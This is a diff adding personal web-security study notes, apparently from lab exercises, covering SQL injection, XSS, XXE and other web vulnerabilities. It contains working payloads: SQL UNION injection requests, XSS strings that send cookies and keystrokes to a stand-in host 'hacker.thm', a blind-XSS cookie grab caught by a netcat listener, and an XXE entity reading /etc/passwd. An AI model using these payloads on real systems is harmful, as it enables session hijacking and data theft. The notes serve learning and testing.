@@ -1,0 +1,203 @@
+= Website
+
+== Burp Suite Issue Definitions
+
+https://portswigger.net/kb/issues
+
+== Sensitive Data Exposure
+When a website doesn't protect (or remove) clear-text information to the end-user
+
+* login credentials
+* hidden links to private parts of the website
+* other sensitive data shown in HTML or JavaScript
+
+One of the first thing to do when assessing website security is view page source (CTRL+U) for this information.
+
+== IDOR (Insecure Direct Object References)
+Get other information from an endpoint by referencing other objects.
+
+Example: a ticketing system with the ID at the end of the endpoint, and we can access ticket not assigned to us normally by just selecting another ID.
+
+== CSRF (Cross-Site Request Forgery)
+Information automatically added to a request to make brute forcing harder.
+
+Can be countered with macros in BurpSuite -> execute some actions before execute a request
+
+== Injection
+=== HTML Injection
+When unfiltered user input is displayed on the page; an attacker can inject HTML and JavaScript code into a vulnerable website.
+
+It is crucial to apply input sanitization (remove HTML tags) -> Never trust user input
+
+=== SQL Injection
+Input contains SQL query executed by a database behind the website.
+
+*Usually, try to add a single apostrophe ' in a field to try SQLi*
+
+[source,bash]
+-----
+GET /about/0' HTTP/1.1
+-----
+
+This may create an issue that indicates an error when execute in a database. We now need to find more info about the tables.
+
+[source,bash]
+-----
+GET /about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns where table_name="people" HTTP/1.1
+-----
+
+This creates a union query and selects our target then four null columns (to avoid the query erroring out). We also changed the ID that we are selecting from 2 to 0.
+
+By setting the ID to an invalid number, we  ensure that we don't retrieve anything with the original (legitimate) query; this means that the first row returned from the database will be our desired response from the injected query.
+
+Finally, to get the needed information:
+[source,bash]
+-----
+GET /about/0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1 HTTP/1.1
+-----
+
+=== SMTP header injection
+When user input is placed into email headers without adequate sanitization -> allow an attacker to inject additional headers with arbitrary values.
+
+Can be exploited to send copies of emails to third parties, attach viruses, phishing, ...
+
+=== OS command injection
+It is possible to use various shell metacharacters to inject arbitrary OS commands. The command output does not appear to be returned in the application's responses. However, it is possible to cause the application to interact with an external domain, to verify that a command was executed.
+
+Shell operators ";", "&" and "&&" will combine two (or more) system commands and execute them both.
+
+== Serialized object in HTTP message
+Applications may submit a serialized object in a request parameter
+
+* sensitive data contained within the object can be viewed by the user
+* may internet with server-side logic by tampering with the contents of the object and re-serializing it
+* cause unauthorized code execution on the server by controlling the server-side function that is invoked when the object is processed
+
+== XSS (Cross-site scripting)
+Some validation can be applied on fields as we type. We can just enter a legitimate info and intercept the request with Burp Proxy and modify it before forwarding it to the server.
+
+=== Examples
+PoC
+[source,javascript]
+----
+<script>alert('XSS');</script>
+
+<!-- close HTML tag before adding script -->
+"><script>alert('XSS');</script>
+</textarea><script>alert('XSS');</script>
+----
+
+Session stealing with document.cookie
+[source,javascript]
+----
+<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+----
+
+Key Logger
+[source,javascript]
+----
+<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+----
+
+Business Logic
+[source,javascript]
+----
+<script>user.changeEmail('attacker@hacker.thm');</script>
+----
+
+If the data is reflected using DOM (abc is the input value)
+[source,javascript]
+----
+<script>document.getElementsByClassName('name')[0].innerHTML='abc';
+
+<!-- Escape existing JS command with payload ';alert('THM');// to end up with... -->
+
+<script>document.getElementsByClassName('name')[0].innerHTML='';alert('THM');//;
+----
+The quote closes the field specifying the name, then ; signifies the end of the current command, and the // at the end makes anything after it a comment than executable code.
+
+Filter evasion (if script is removed for example)
+[source,javascript]
+----
+<!-- original payload -->
+<sscriptcript>alert('THM');</sscriptcript>
+
+<!-- resulting payload -->
+<script>alert('THM');</script>
+----
+
+Use onload for img tag
+[source,javascript]
+----
+/images/cat.jpg" onload="alert('THM');
+
+<!-- end result -->
+<img src="/images/cat.jpg" onload="alert('THM');">
+----
+
+==== XSS Polyglot
+String of text which can escape attributes, tags and bypass filters all in one.
+
+[source,javascript]
+----
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+----
+
+=== DOM based
+The application may be vulnerable to DOM-based cross-site scripting. Data is read from location.search and passed to element.innerHTML.
+
+DOM-based vulnerabilities arise when a client-side script reads data from a controllable part of the DOM (for example, the URL) and processes this data in an unsafe way.
+
+=== Blind XSS
+We need some kind of URL to redirect the information to.
+
+We can create a listener for that
+[source,bash]
+----
+nc -nlvp 9001
+----
+
+If the information we add (create a support ticket for instance) is displayed in a textarea, we can add the following
+
+[source,javascript]
+----
+</textarea><script>fetch('http://{URL_OR_IP}:9001?cookie=' + btoa(document.cookie) );</script>
+
+----
+
+When someone open the ticket, we get info like this
+[source,bash]
+----
+root@ip-10-10-171-45:~# nc -nlvp 9001
+Listening on [0.0.0.0] (family 0, port 9001)
+Connection from 10.10.245.217 41942 received!
+GET /?cookie=c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ== HTTP/1.1
+Host: 10.10.171.45:9001
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/89.0.4389.72 Safari/537.36
+Accept: */*
+Origin: http://172.17.0.1
+Referer: http://172.17.0.1/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+
+----
+
+
+== XML external entity injection
+The application is vulnerable to XML external entity injection. The tag <!DOCTYPE foo [<!ENTITY xxe0wi5o SYSTEM "file:///etc/passwd"> ]> was injected into the XML sent to the server.
+
+This tag defines an external entity, xxe0wi5o, which references a file on the XML parser's filesystem. This entity was then used within a data field in the XML document. The server's response contains the contents of the specified file, indicating that the parser processed the injected external entity.
+
+== External service interaction (HTTP)
+It is possible to induce the application to perform server-side HTTP and HTTPS requests to arbitrary domains.
+
+The payload http://tkhuhul11ut7e42w7a9rowccd3jw7zvsxgs3jr8.burpcollaborator.net/ was submitted in the Referer HTTP header.
+
+The application performed an HTTP request to the specified domain.
+
+== Web cache poisoning
+The application supports the use of a custom HTTP header to override the Host header, and uses a cache that can be manipulated into saving responses that have been influenced by this header.
+
+== Server-side template injection
+Payload is interpreted by a server-side template engine.
